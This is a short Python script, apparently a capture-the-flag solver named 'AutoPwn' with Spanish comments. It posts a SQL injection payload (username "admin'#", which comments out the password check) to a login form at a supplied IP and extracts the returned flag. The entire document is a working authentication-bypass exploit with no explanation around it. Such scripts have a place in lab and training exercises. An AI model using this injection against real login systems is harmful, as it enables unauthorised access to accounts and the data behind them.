#!/usr/bin/python3

import argparse
import requests
import re

class Exploit:
    def __init__(self, ip_address):
        self.ip_address = ip_address

    def run(self, ip_address):

        url = "http://" + self.ip_address
        
        data = {
            "username": "admin'#",
            "password": "admin"
        }

        response = requests.post(url, data=data)
        flag = re.search(r"<h4>Your flag is: ([^<]*)", response.text).group(1)
        flag = flag.strip()  # Eliminar espacios en blanco alrededor de la bandera

        print
        print(f"\nEl contenido de la 'flag': ", flag)

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    return parser.parse_args()

def main():
    args = get_arguments()

    exploit = Exploit(args.ip_address)
    exploit.run(args.ip_address)

if __name__ == '__main__':
    main()





















